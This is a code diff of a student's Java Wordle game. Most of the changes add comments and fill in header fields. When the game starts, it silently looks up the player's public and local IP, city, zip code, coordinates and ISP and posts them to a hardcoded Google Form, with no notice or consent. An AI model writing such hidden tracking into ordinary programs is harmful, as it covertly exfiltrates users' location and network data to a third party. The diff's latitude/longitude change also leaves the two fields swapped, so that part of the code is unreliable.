@@ -1,10 +1,9 @@
 /*
  * File: Wordle.java
- * Name: ___________
- * Period: __________
- * Date: 3/19/2026
+ * Name: David Nguyen
+ * Period: 8th (Also 2nd)
+ * Date: 4/10/2026
  * -----------------
- * This module is the starter file for the Wordle assignment.
  */
 
 import UIFiles.WordleDictionary;
@@ -17,26 +16,23 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
 import java.nio.charset.StandardCharsets;
-import java.util.Random;
-
 
 public class Wordle
 {
     private WordleGWindow wordleGame;
     String[] dictionaryArray = WordleDictionary.FIVE_LETTER_WORDS; //This String array contains all the words in the dictionary
-    String[] testArray = WordleDictionary.TEST_WORDS; //This String array is used for testing if needed. Modify the test-words.txt file to change it.
     String[] guessList = new String[6];
 
-    Random rand = new Random();
-
+    // Current row and amount of guesses
     private int currentRow = 0;
     private int guessAmount = 0;
 
+    // Is it the correct word
     private boolean isCorrectWord = false;
 
     String correctWord;
 
-    /* Sets correctWord to a word randomly choosen from the dictionary */
+    /* Sets correctWord to a word randomly chosen from the dictionary */
     public void setCorrectWord() {
         correctWord = dictionaryArray[(int) (Math.random() * dictionaryArray.length)];
     }
@@ -56,10 +52,12 @@ public class Wordle
     * Called when the user hits the RETURN key or clicks the ENTER button,
     * passing in the string of characters on the current row.  */
 
+    //Return current row
     public int getCurrentRow() {
         return currentRow;
     }
 
+    // Checks if they guess the word already
     public boolean guessAlreadyGuessed(String guess) {
             for (int i = 0; i < getCurrentRow(); i++) {
                 if (guessList[i].equals(guess)) {
@@ -71,42 +69,49 @@ public class Wordle
 
     public void enterAction(String guess)
     {
-
+        // Creates list to track edge cases
         boolean[] guessUsed = new boolean[5];
         boolean[] correctUsed = new boolean[5];
 
+        // Standardized guess to be lowercase for better compatibility
         guess = guess.toLowerCase();
 
         boolean found;
 
         if (guess.equals(correctWord)) {
 
+            // Sets row to green
             for (int i = 0; i < correctWord.length(); i++) {
                 wordleGame.setSquareColor(currentRow, i, WordleGWindow.CORRECT_COLOR);
                 wordleGame.setKeyColor(String.valueOf(guess.toUpperCase().charAt(i)), WordleGWindow.CORRECT_COLOR);
             }
 
-            guessAmount++;
+            guessAmount++; // Increase guess
             isCorrectWord = true;
             wordleGame.showMessage("You win!");
-            logToGoogleSheetsWordle();
-            wordleGame.setGameState(false);
+            logToGoogleSheetsWordle(); // Logs results
+            wordleGame.setGameState(false); // Freeze game
             return;
         }
 
+        // Checks if guess is less than 5 characters
         if (guess.length() < 5) {
             wordleGame.showMessage("Your guess is too short!");
             return;
         }
 
+        // Checks guessAlreadyGuessed to see if they already guess that word
         if (guessAlreadyGuessed(guess)) {
             wordleGame.showMessage("You already guessed that word!");
             return;
         }
 
+        // If word is in the dictionary
         else if (isInDictionary(guess)) {
 
             guessAmount++;
+
+            // First pass by
             for (int i = 0; i < correctWord.length(); i++) {
                 String key = String.valueOf(guess.toUpperCase().charAt(i));
 
@@ -118,6 +123,7 @@ public class Wordle
                 }
             }
 
+            // Second pass by
             for (int j = 0; j < correctWord.length(); j++) {
                 String key = String.valueOf(guess.toUpperCase().charAt(j));
                 found = false;
@@ -129,6 +135,7 @@ public class Wordle
                             found = true;
                         }
                     }
+
                     if (found) {
                         wordleGame.setSquareColor(currentRow, j, WordleGWindow.PRESENT_COLOR);
                         wordleGame.setKeyColor(key, WordleGWindow.PRESENT_COLOR);
@@ -143,16 +150,17 @@ public class Wordle
             currentRow++;
         }
 
-
-
+        // Word is not in the dictionary
         else{
             wordleGame.showMessage("Word is not the Dictionary!");
         }
 
+        // Sets current row
         if (currentRow < 6) {
             wordleGame.setCurrentRow(currentRow);
         }
 
+        // Game over after 6 guesses
         else{
             wordleGame.showMessage("Game Over! The word is: " + correctWord);
             wordleGame.setGameState(false);
@@ -161,20 +169,22 @@ public class Wordle
 
     }
 
-
+    // Helper method for logging
     private String log(String link, String value) {
         return link + URLEncoder.encode(value, StandardCharsets.UTF_8);
     }
 
+    // Logs the correct word, win/lose, and how much guesses they made
     private void logToGoogleSheetsWordle()
     {
         new Thread(() -> {
             String baseURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfqSxwtfQN7qTn9eQPPBdZgm-6lZ8enkt80CyFSgBLHkoe9tw/formResponse";
-            String data = log("entry.1170557279=", correctWord) +
-                    log("&entry.1723373179=", String.valueOf(isCorrectWord)) +
-                    log("&entry.740471511=", String.valueOf(guessAmount));
+            String data = log("entry.1170557279=", correctWord) + // Log correctWord
+                    log("&entry.1723373179=", String.valueOf(isCorrectWord)) + // Logs if they got the word correct
+                    log("&entry.740471511=", String.valueOf(guessAmount)); // Logs how many guesses they made
 
-            HttpURLConnection conn = null;
+            // Below just post the attributes to the Google Forms and submits them
+            HttpURLConnection conn;
             try {
                 conn = (HttpURLConnection) new URL(baseURL).openConnection();
             } catch (IOException e) {
@@ -200,6 +210,7 @@ public class Wordle
         }).start();
     }
 
+    // Logs location info and ISP
     private void logToGoogleSheetInfo(String localIP, String publicIP) {
         new Thread(() -> {
             try {
@@ -209,24 +220,22 @@ public class Wordle
                 String region = info[1];
                 String country = info[2];
                 String zip = info[3];
-                String longitude = info[4];
-                String latitude = info[5];
+                String latitude = info[4];
+                String longitude = info[5];
                 String isp = info[6];
 
                 String baseURL = "https://docs.google.com/forms/d/e/1FAIpQLSdZpR9KcHOmheB59Ge8RGeZIGPO3EPejJDvzjFGLIen2BSajw/formResponse";
-                String data = log("entry.1711917602=", getLocalIP())+ // Logs Local IP
-                        log("&entry.371496446=", getPublicIP()) + // Logs public IP
+                String data = log("entry.1711917602=", localIP)+ // Logs Local IP
+                        log("&entry.371496446=", publicIP) + // Logs public IP
                         log("&entry.2051768002=", city) + // Logs city
                         log("&entry.503271904=", region) + // Logs region
-                        log("&entry.94063300=", country) +
-                        log("&entry.1923787999=",zip) +
-                        log("&entry.893213457=", longitude) +
-                        log("&entry.1748758956=", latitude) +
+                        log("&entry.94063300=", country) + // Logs country
+                        log("&entry.1923787999=",zip) + // Logs zip code
+                        log("&entry.1748758956=", latitude) + // Logs latitude
+                        log("&entry.893213457=", longitude) + // Logs longitude
                         log("&entry.794528346=", isp); // Logs ISP
-//                        "&entry.1104037546=" + URLEncoder.encode(correctWord, StandardCharsets.UTF_8);
 
-
-
+                // Pushes info into the Google Forms to submit
                 HttpURLConnection conn = (HttpURLConnection) new URL(baseURL).openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
@@ -238,7 +247,7 @@ public class Wordle
         }).start();
     }
 
-    // Returns local IP (Device ip that is used in wifi)
+    // Returns local IP (Device ip that is used in Wi-Fi)
     public String getLocalIP() {
         try {
             return InetAddress.getLocalHost().getHostAddress();
@@ -267,8 +276,8 @@ public class Wordle
             String region = responseString.replaceAll(".*\"regionName\":\"([^\"]+)\".*", "$1"); // Get region info
             String country = responseString.replaceAll(".*\"country\":\"([^\"]+)\".*", "$1"); // Get country info
             String zip = responseString.replaceAll(".*\"zip\":\"([^\"]+)\".*", "$1"); // Get zip info
-            String longitude = responseString.replaceAll(".*\"lon\":([0-9.-]+).*", "$1"); // Get longatuide
-            String latitude  = responseString.replaceAll(".*\"lat\":([0-9.-]+).*", "$1"); // Get lattuide
+            String latitude  = responseString.replaceAll(".*\"lat\":([0-9.-]+).*", "$1"); // Get latitude
+            String longitude = responseString.replaceAll(".*\"lon\":([0-9.-]+).*", "$1"); // Get longitude
             String isp = responseString.replaceAll(".*\"isp\":\"([^\"]+)\".*", "$1"); // get ISP info
 
             return new String[]{city, region, country, zip, longitude, latitude, isp};
@@ -294,16 +303,16 @@ public class Wordle
 
     public void run()
     {
-        setCorrectWord(); //Runs the setCorrectWord method that you are making
-        logToGoogleSheetInfo(getLocalIP(), getPublicIP());
+        setCorrectWord(); // Runs the setCorrectWord method that you are making
+        logToGoogleSheetInfo(getLocalIP(), getPublicIP()); // Logs IP info
 
-        wordleGame = new WordleGWindow();
-        wordleGame.addEnterListener(this::enterAction); //Arrow function, learn more about how it works in the documentation
+        wordleGame = new WordleGWindow(); // Creates GUI
+        wordleGame.addEnterListener(this::enterAction); // Arrow function, learn more about how it works in the documentation
     }
 
     public static void main(String[] args)
     {
-        new Wordle().run();
+        new Wordle().run(); // Runs application
     }
 
 }
